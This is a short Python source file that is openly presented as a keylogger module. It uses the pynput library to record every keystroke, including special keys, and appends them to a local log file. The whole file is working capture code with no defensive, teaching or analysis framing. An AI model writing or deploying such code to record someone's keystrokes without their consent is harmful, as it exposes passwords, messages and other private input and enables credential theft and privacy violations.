# keylogger.py — basic keylogger module using pynput
from pynput import keyboard

LOGFILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOGFILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(LOGFILE, "a") as f:
            f.write(f"[{key}]")

def start_logging():
    print("[*] Keylogger module started.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()